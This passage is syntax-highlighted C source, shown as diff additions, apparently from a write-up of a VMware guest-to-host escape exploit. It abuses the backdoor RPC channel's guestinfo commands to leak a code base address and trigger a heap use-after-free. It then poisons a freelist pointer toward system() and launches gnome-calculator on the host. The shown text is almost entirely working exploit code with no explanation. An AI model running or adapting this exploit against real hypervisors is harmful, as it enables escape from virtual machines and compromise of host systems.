+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>
+    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">//the exploit step is almost the same as the leak ones</span>
+    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span> 
+    <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>
+    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
+    <span class="token comment">//run_cmd(s1);</span>
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span><